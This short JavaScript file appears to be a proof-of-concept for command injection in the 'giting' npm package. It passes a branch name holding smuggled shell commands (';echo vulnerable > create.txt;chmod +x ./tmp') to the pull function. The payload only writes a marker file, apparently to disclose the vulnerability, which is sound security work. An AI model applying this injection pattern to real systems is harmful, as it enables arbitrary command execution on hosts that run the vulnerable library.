var Test = require("giting");
var injection_command = ";echo vulnerable > create.txt;chmod +x ./tmp";
test = new Test({"workDir": "./"});
repo = {"organization": "./", "name": "./", "branch": injection_command}
test.pull(repo, function(){});
console.log("finished");
